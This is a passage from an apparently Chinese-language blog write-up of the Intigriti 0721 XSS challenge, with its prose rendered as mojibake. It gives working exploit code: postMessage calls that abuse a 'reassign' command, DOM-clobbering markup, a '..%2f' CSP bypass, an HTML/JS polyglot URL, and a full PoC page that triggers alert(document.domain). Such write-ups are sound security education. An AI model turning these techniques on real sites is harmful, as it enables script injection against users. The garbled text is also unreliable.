punctuation\">(</span>e<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// make object look like string</span></code></pre>\n<p>å¦‚æœ e æ˜¯å­—ä¸²ï¼Œé‚£å°±å›å‚³ <code>s(e)</code>ï¼Œè€Œé€™å€‹ s æ˜¯å¦å¤–ä¸€å€‹å‡½å¼ã€‚</p>\n<p>ç•¶åˆåœ¨çœ‹ç¨‹å¼ç¢¼çš„æ™‚å€™ï¼Œæˆ‘çœ‹åˆ° reassign é‚£é‚Šå°æ–¼ eval çš„æª¢æŸ¥æ™‚ï¼Œå°±æ³¨æ„åˆ°äº†å®ƒçš„è¦å‰‡ï¼š<code>RegExp = /^[s-zA-Z-+0-9]+$/;</code>ï¼Œé‚„æœ‰åº•ä¸‹é€™å››å€‹å‡½å¼ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> <span class=\"token function-variable function\">a</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">s</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> s<span class=\"token punctuation\">.</span><span class=\"token function\">anchor</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">let</span> <span class=\"token function-variable function\">s</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">s</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> s<span class=\"token punctuation\">.</span><span class=\"token function\">normalize</span><span class=\"token punctuation\">(</span><span class=\"token string\">'NFC'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">let</span> <span class=\"token function-variable function\">u</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">s</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token function\">unescape</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">let</span> <span class=\"token function-variable function\">t</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">s</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> s<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre>\n<p>å…¶ä¸­ s, u è·Ÿ t é€™ä¸‰å€‹å­—å…ƒéƒ½æ˜¯å…è¨±çš„ï¼Œä¹Ÿå°±æ˜¯èªªï¼Œå¯ä»¥é€é reassign é€™å€‹æŒ‡ä»¤æŠŠä»–å€‘äº’æ›ï¼æˆ‘å€‘å¯ä»¥æŠŠ <code>s</code> æ›æˆ <code>u</code>ï¼Œé€™æ¨£ data å°±æœƒè¢« unescape äº†ï¼</p>\n<p>æ‰€ä»¥æœ€å¾Œçš„ç¨‹å¼ç¢¼æœƒé•·é€™æ¨£ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> htmlUrl <span class=\"token operator\">=</span> <span class=\"token string\">'https://challenge-0721.intigriti.io/htmledit.php?code='</span><br><span class=\"token keyword\">const</span> insertPayload<span class=\"token operator\">=</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">&lt;img src=x onerror=alert(1)></span><span class=\"token template-punctuation string\">`</span></span><br><span class=\"token keyword\">const</span> payload <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\"><br>  &lt;a id=\"DEV\">&lt;/a><br>  &lt;iframe name=\"store\" srcdoc='<br>    &lt;a id=\"users\">&lt;/a><br>    &lt;a id=\"users\" name=\"admin\" href=\"ftp://a:a@a#</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">escape</span><span class=\"token punctuation\">(</span>insertPayload<span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\">&lt;/a><br>  '>&lt;/iframe><br>  &lt;iframe name=\"iframeConsole\" src=\"https://challenge-0721.intigriti.io/console.php\">&lt;/iframe><br></span><span class=\"token template-punctuation string\">`</span></span><br><br><span class=\"token keyword\">var</span> win <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span>htmlUrl <span class=\"token operator\">+</span> <span class=\"token function\">encodeURIComponent</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br><span class=\"token comment\">// ç­‰å¾… window è¼‰å…¥å®Œæˆ</span><br><span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'go'</span><span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">const</span> credentials <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>    username<span class=\"token operator\">:</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><br>    password<span class=\"token operator\">:</span> <span class=\"token string\">'a'</span><br>  <span class=\"token punctuation\">}</span><br>  <span class=\"token comment\">// s=u</span><br>  win<span class=\"token punctuation\">.</span>frames<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>    cmd<span class=\"token operator\">:</span> <span class=\"token string\">'reassign'</span><span class=\"token punctuation\">,</span><br>    message<span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>      a<span class=\"token operator\">:</span> <span class=\"token string\">'s'</span><span class=\"token punctuation\">,</span><br>      b<span class=\"token operator\">:</span> <span class=\"token string\">'u'</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>    credentials<br>  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><br><br>  <span class=\"token comment\">// Z=x+1 so Z = x.href + 1</span><br>  win<span class=\"token punctuation\">.</span>frames<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>    cmd<span class=\"token operator\">:</span> <span class=\"token string\">'reassign'</span><span class=\"token punctuation\">,</span><br>    message<span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>      a<span class=\"token operator\">:</span> <span class=\"token string\">'Z'</span><span class=\"token punctuation\">,</span><br>      b<span class=\"token operator\">:</span> <span class=\"token string\">'x+1'</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>    credentials<br>  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><br><br>  <span class=\"token comment\">// log window[Z]</span><br>  win<span class=\"token punctuation\">.</span>frames<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>    cmd<span class=\"token operator\">:</span> <span class=\"token string\">'logv'</span><span class=\"token punctuation\">,</span><br>    message<span class=\"token operator\">:</span> <span class=\"token string\">'Z'</span><span class=\"token punctuation\">,</span><br>    credentials<br>  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5000</span><span class=\"token punctuation\">)</span></code></pre>\n<p>æ‰€ä»¥ data æœƒæ˜¯ <code>ftp://a:a@a#&lt;img src=x onerror=alert(1)&gt;</code>ï¼Œç„¶å¾Œè¢«è¨­å®šåˆ° HTML ä¸Šé¢ï¼Œè§¸ç™¼ XSSï¼</p>\n<p>ä¸ï¼Œäº‹æƒ…æ²’é‚£éº¼é †åˆ©...æˆ‘å¿˜è¨˜æœ‰ CSP äº†ã€‚</p>\n<h2 id=\"%E7%AC%AC%E5%85%AD%E9%97%9C%EF%BC%9A%E7%B9%9E%E9%81%8E-csp\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E5%85%AD%E9%97%9C%EF%BC%9A%E7%B9%9E%E9%81%8E-csp\">#</a> ç¬¬å…­é—œï¼šç¹é CSP</h2>\n<p>é›–ç„¶æˆ‘å¯ä»¥æ’å…¥ä»»æ„ HTMLï¼Œä½†å¾ˆéºæ†¾åœ°é€™å€‹ç¶²é ä¹Ÿæœ‰ CSPï¼š</p>\n<pre><code>script-src \n'nonce-xxx' \nhttps://challenge-0721.intigriti.io/analytics/ \n'unsafe-eval';\n\nframe-src https:;\n\nobject-src 'none';base-uri 'none';\n</code></pre>\n<p>å› ç‚ºæ²’æœ‰ <code>unsafe-inline</code>ï¼Œæ‰€ä»¥æˆ‘å€‘ä¹‹å‰çš„ payload æ˜¯ç„¡æ•ˆçš„ã€‚è€Œé€™ä¸€æ®µ CSP ç•¶ä¸­ï¼Œ<code>https://challenge-0721.intigriti.io/analytics/</code> é¡¯ç„¶æ˜¯å€‹å¾ˆå¯ç–‘çš„è·¯å¾‘ã€‚</p>\n<p>é€™å€‹é é¢å…¶å¯¦æœ‰å¼•å…¥ä¸€å€‹ <a href=\"https://challenge-0721.intigriti.io/analytics/main.js\">https://challenge-0721.intigriti.io/analytics/main.js</a> çš„æª”æ¡ˆï¼Œä½†è£¡é¢æ²’æœ‰æ±è¥¿ï¼Œåªæœ‰ä¸€äº›è¨»è§£è€Œå·²ã€‚</p>\n<p>å…¶å¯¦çœ‹åˆ°é€™é‚Šçš„æ™‚å€™æˆ‘å°±çŸ¥é“è¦æ€éº¼åšäº†ï¼Œå› ç‚ºæˆ‘ä¹‹å‰æœ‰å­¸åˆ°ä¸€å€‹ç¹é CSP çš„æŠ€å·§ï¼Œåˆ©ç”¨<code>%2F</code>ï¼ˆç·¨ç¢¼éå¾Œçš„ <code>/</code>ï¼‰ä»¥åŠå‰å¾Œç«¯å°æ–¼ URL è§£æçš„ä¸ä¸€è‡´ã€‚</p>\n<p>ä»¥ <code>https://challenge-0721.intigriti.io/analytics/..%2fhtmledit.php</code> ç‚ºä¾‹ï¼Œå°ç€è¦½å™¨ä¾†èªªï¼Œé€™å€‹ URL æ˜¯åœ¨ <code>/analytics</code> åº•ä¸‹ï¼Œæ‰€ä»¥å¯ä»¥é€šé CSP çš„æª¢æŸ¥ã€‚</p>\n<p>ä½†æ˜¯å°ä¼ºæœå™¨ä¾†èªªï¼Œé€™ä¸€æ®µæ˜¯ <code>https://challenge-0721.intigriti.io/analytics/../htmledit.php</code> ä¹Ÿå°±æ˜¯ <code>https://challenge-0721.intigriti.io/htmledit.php</code></p>\n<p>æ‰€ä»¥æˆ‘å€‘æˆåŠŸç¹éäº† CSPï¼Œè¼‰å…¥ä¸åŒè·¯å¾‘çš„æª”æ¡ˆï¼</p>\n<p>å› æ­¤ç¾åœ¨çš„ç›®æ¨™å°±è®Šæˆæˆ‘å€‘è¦æ‰¾ä¸€å€‹æª”æ¡ˆè£¡é¢å¯ä»¥è®“æˆ‘å€‘æ”¾ JS ç¨‹å¼ç¢¼ã€‚çœ‹ä¾†çœ‹å»éƒ½åªæœ‰ htmledit.php èƒ½ç”¨ï¼Œä½†å®ƒä¸æ˜¯ä¸€å€‹ HTML å—ï¼Ÿ</p>\n<h2 id=\"%E7%AC%AC%E4%B8%83%E9%97%9C%EF%BC%9A%E6%A7%8B%E9%80%A0-js-%E7%A8%8B%E5%BC%8F%E7%A2%BC\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%83%E9%97%9C%EF%BC%9A%E6%A7%8B%E9%80%A0-js-%E7%A8%8B%E5%BC%8F%E7%A2%BC\">#</a> ç¬¬ä¸ƒé—œï¼šæ§‹é€  JS ç¨‹å¼ç¢¼</h2>\n<p>å¦‚æœä½ é‚„è¨˜å¾—çš„è©±ï¼Œé€™å€‹é é¢çš„é–‹é ­æœ‰ä¸€æ®µæ˜¯ HTML çš„è¨»è§£ï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token comment\">&lt;!-- &amp;lt;img src=x&amp;gt; --></span><br>....</code></pre>\n<p>è€Œåœ¨ä¸€äº›æƒ…æ³ä¸‹ï¼Œå…¶å¯¦é€™èªæ³•ä¹Ÿæ˜¯ JS çš„è¨»è§£ã€‚ä¸æ˜¯æˆ‘èªªçš„ï¼Œæ˜¯è¦æ ¼æ›¸èªªçš„ï¼š</p>\n<p><img src=\"/img/posts/huli/xss-0721/spec.png\" alt=\"ECMAScript spec\"></p>\n<p>æ›å¥è©±èªªå‘¢ï¼Œæˆ‘å€‘å¯ä»¥åˆ©ç”¨é€™é»ï¼Œåšå‡ºä¸€å€‹çœ‹èµ·ä¾†åƒ HTMLï¼Œä½†å¯¦éš›ä¸Šä¹Ÿæ˜¯åˆæ³• JS çš„æª”æ¡ˆï¼</p>\n<p>æˆ‘æœ€å¾Œåšå‡ºä¾†çš„ URL æ˜¯é€™æ¨£ï¼š<code>https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/*</code></p>\n<p>ç”¢ç”Ÿçš„ HTML é•·é€™æ¨£ï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token comment\">&lt;!-- 1; é€™é‚Šéƒ½æ˜¯è¨»è§£<br>top.alert(document.domain);/* --></span> é€™ä¹‹å¾Œä¹Ÿéƒ½æ˜¯è¨»è§£äº†<br><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span><br>...</code></pre>\n<p>ç¬¬ä¸€è¡Œæ˜¯è¨»è§£ï¼Œ<code>/*</code> ä¹‹å¾Œä¹Ÿéƒ½æ˜¯è¨»è§£ï¼Œæ‰€ä»¥é€™ä¸€æ•´æ®µå…¶å¯¦å°±æ˜¯ <code>top.alert(document.domain);</code> çš„æ„æ€ã€‚</p>\n<p>ä¸éé€™é‚Šå¯ä»¥æ³¨æ„çš„æ˜¯ htmledit.php çš„ content type ä¸æœƒè®Šï¼Œä¾ç„¶é‚„æ˜¯ <code>text/html</code>ï¼Œä¹‹æ‰€ä»¥å¯ä»¥æŠŠå®ƒç•¶ä½œ JS å¼•å…¥ï¼Œæ˜¯å› ç‚ºåŒæºçš„é—œä¿‚ã€‚å¦‚æœä½ æ˜¯æŠŠä¸€å€‹ä¸åŒæºçš„ HTML ç•¶ä½œ JS å¼•å…¥ï¼Œå°±æœƒè¢« <a href=\"https://www.chromium.org/Home/chromium-security/corb-for-developers\">CORB</a> çµ¦æ“‹ä¸‹ä¾†ã€‚</p>\n<p>åšåˆ°é€™é‚Šï¼Œæˆ‘å€‘å°±å¯ä»¥è®“ data æ˜¯ <code>&lt;script src=&quot;https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/*&quot;&gt;&lt;/script&gt;</code></p>\n<p>é€™æ¨£å°±æœƒåŸ·è¡Œåˆ° <code>text_tag.innerHTML = data</code>ï¼ŒæˆåŠŸåœ¨é é¢ä¸Šæ”¾é€²å» script é‚„ç¹éäº† CSPï¼Œå®Œç¾ï¼</p>\n<p>ä½†å¯æƒœçš„æ˜¯ï¼Œé‚„å·®ä¸€é»é»...</p>\n<h2 id=\"%E7%AC%AC%E5%85%AB%E9%97%9C%EF%BC%9A%E5%9F%B7%E8%A1%8C%E5%8B%95%E6%85%8B%E6%8F%92%E5%85%A5%E7%9A%84-script\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E5%85%AB%E9%97%9C%EF%BC%9A%E5%9F%B7%E8%A1%8C%E5%8B%95%E6%85%8B%E6%8F%92%E5%85%A5%E7%9A%84-script\">#</a> ç¬¬å…«é—œï¼šåŸ·è¡Œå‹•æ…‹æ’å…¥çš„ script</h2>\n<p>å°±åœ¨æˆ‘ä»¥ç‚ºè¦éé—œçš„æ™‚å€™ï¼Œå»ç™¼ç¾æˆ‘çš„ script æ€æ¨£éƒ½ä¸æœƒåŸ·è¡Œã€‚å¾Œä¾†ç”¨<a href=\"https://stackoverflow.com/questions/1197575/can-scripts-be-inserted-with-innerhtml\">é—œéµå­—</a>å»æŸ¥ï¼Œæ‰ç™¼ç¾å¦‚æœæ˜¯ç”¨ innerHTML æ’å…¥ script æ¨™ç±¤ï¼Œæ’å…¥ä¹‹å¾Œæ˜¯ä¸æœƒå»åŸ·è¡Œçš„ã€‚</p>\n<p>æˆ‘è©¦è‘—ç”¨ <code>innerhtml import script</code> æˆ–æ˜¯ <code>innerhtml script run</code> ä¹‹é¡çš„é—œéµå­—å»æ‰¾è§£æ³•ä½†éƒ½æ²’æ‰¾åˆ°ã€‚</p>\n<p>æœ€å¾Œï¼Œæˆ‘æ˜¯çªç„¶æƒ³åˆ°å¯ä»¥è©¦è©¦çœ‹ <code>&lt;iframe srcdoc=&quot;...&quot;&gt;</code>ï¼Œæœ‰ç¨®æ­»é¦¬ç•¶æ´»é¦¬é†«çš„æ„Ÿè¦ºï¼Œåæ­£å°±è©¦è©¦çœ‹é€™æ¨£è¡Œä¸è¡Œï¼Œæ²’æœ‰æå¤±ã€‚</p>\n<p>çµæœæ²’æƒ³åˆ°å°±å¯ä»¥äº†ã€‚ç›´æ¥ assign çµ¦ innerHTML ä¸è¡Œï¼Œä½†å¦‚æœå…§å®¹æ˜¯ï¼š<code>&lt;iframe srcdoc=&quot;&lt;script src='...'&gt;&lt;/script&gt;&quot;</code> å°±å¯ä»¥ï¼Œå°±æœƒç›´æ¥è¼‰å…¥ scriptã€‚</p>\n<h2 id=\"%E6%9C%80%E5%BE%8C%E8%A7%A3%E6%B3%95\"><a class=\"direct-link\" href=\"#%E6%9C%80%E5%BE%8C%E8%A7%A3%E6%B3%95\">#</a> æœ€å¾Œè§£æ³•</h2>\n<p>æœ€å¾Œå†è£œå……ä¸€ä»¶äº‹æƒ…ï¼Œæˆ‘è¦é€å‡ºç­”æ¡ˆä¹‹å‰ç™¼ç¾æˆ‘çš„ç­”æ¡ˆåœ¨ Firefox ä¸Šé¢ä¸èƒ½è·‘ï¼ŒåŸå› æ˜¯é€™æ®µç¨‹å¼ç¢¼ï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>users<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>users<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>admin<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>a<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>åœ¨ Chrome ä¸Š <code>window.users</code> æœƒæ˜¯ HTMLCollectionï¼Œä½†åœ¨ Firefox ä¸Šé¢åªæœƒæ‹¿åˆ°ä¸€å€‹ a å…ƒç´ ï¼Œè€Œ <code>window.users.admin</code> ä¹Ÿå°±æ˜¯ undefinedã€‚</p>\n<p>ä½†é€™å•é¡Œä¸å¤§ï¼Œåªè¦å¤šä¸€å±¤ iframe å°±å¯ä»¥æå®šï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>store<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">srcdoc</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><br>  &lt;iframe srcdoc=<span class=\"token punctuation\">'</span>&lt;a id=admin href=ftp://a:a@a#>&lt;/a><span class=\"token punctuation\">'</span> name=users><br><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>iframe</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>æˆ‘æœ€å¾Œçš„ç­”æ¡ˆé•·é€™æ¨£ï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><br><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>XSS POC<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>  <br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span><br><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>    <span class=\"token keyword\">const</span> htmlUrl <span class=\"token operator\">=</span> <span class=\"token string\">'https://challenge-0721.intigriti.io/htmledit.php?code='</span><br>    <span class=\"token keyword\">const</span> exploitSrc <span class=\"token operator\">=</span> <span class=\"token string\">'/analytics/..%2fhtmledit.php?code=1;%0atop.alert(document.domain);/*'</span><br>    <span class=\"token keyword\">const</span> insertPayload<span class=\"token operator\">=</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">&lt;iframe srcdoc=\"&lt;script src=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>exploitSrc<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">>&lt;\\/script>\"></span><span class=\"token template-punctuation string\">`</span></span><br>    <span class=\"token keyword\">const</span> payload <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\"><br>      &lt;a id=\"DEV\">&lt;/a><br>      &lt;iframe name=\"store\" srcdoc=\"<br>        &lt;iframe srcdoc='&lt;a id=admin href=ftp://a:a@a#</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">escape</span><span class=\"token punctuation\">(</span>insertPayload<span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">>&lt;/a>' name=users><br>      \"><br>      &lt;/iframe><br>      &lt;iframe name=\"iframeConsole\" src=\"https://challenge-0721.intigriti.io/console.php\">&lt;/iframe><br>    </span><span class=\"token template-punctuation string\">`</span></span><br>    <span class=\"token keyword\">var</span> win <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span>htmlUrl <span class=\"token operator\">+</span> <span class=\"token function\">encodeURIComponent</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br>    <span class=\"token comment\">// wait for 3s to let window loaded</span><br>    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>      <span class=\"token keyword\">const</span> credentials <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>        username<span class=\"token operator\">:</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><br>        password<span class=\"token operator\">:</span> <span class=\"token string\">'a'</span><br>      <span class=\"token punctuation\">}</span><br>      win<span class=\"token punctuation\">.</span>frames<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>        cmd<span class=\"token operator\">:</span> <span class=\"token string\">'reassign'</span><span class=\"token punctuation\">,</span><br>        message<span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>          a<span class=\"token operator\">:</span> <span class=\"token string\">'s'</span><span class=\"token punctuation\">,</span><br>          b<span class=\"token operator\">:</span> <span class=\"token string\">'u'</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>        credentials<br>      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><br><br>      win<span class=\"token punctuation\">.</span>frames<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>        cmd<span class=\"token operator\">:</span> <span class=\"token string\">'reassign'</span><span class=\"token punctuation\">,</span><br>        message<span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>          a<span class=\"token operator\">:</span> <span class=\"token string\">'Z'</span><span class=\"token punctuation\">,</span><br>          b<span class=\"token operator\">:</span> <span class=\"token string\">'x+1'</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>        credentials<br>      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><br><br>      win<span class=\"token punctuation\">.</span>frames<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>        cmd<span class=\"token operator\">:</span> <span class=\"token string\">'logv'</span><span class=\"token punctuation\">,</span><br>        message<span class=\"token operator\">:</span> <span class=\"token string\">'Z'</span><span class=\"token punctuation\">,</span><br>        credentials<br>      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3000</span><span class=\"token punctuation\">)</span><br><br>  </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span><br></code></pre>\n<h2 id=\"%E5%85%B6%E4%BB%96%E8%A7%A3%E6%B3%95\"><a class=\"direct-link\" href=\"#%E5%85%B6%E4%BB%96%E8%A7%A3%E6%B3%95\">#</a> å…¶ä»–è§£æ³•</h2>\n<p>æˆ‘çš„æ–¹æ³•æ˜¯æ–°é–‹ä¸€å€‹ window ä¾† post messageï¼Œä½†å…¶å¯¦ä¹Ÿå¯ä»¥æŠŠè‡ªå·±ä½œç‚º iframeï¼Œè®“ htmledit.php embedï¼Œé€™æ¨£çš„è©±å…¶å¯¦ä¹Ÿå¯ä»¥ç”¨ top.postMessage å»å‚³é€è¨Šæ¯ã€‚</p>\n<p>ã€ŒæŠŠè‡ªå·± embed 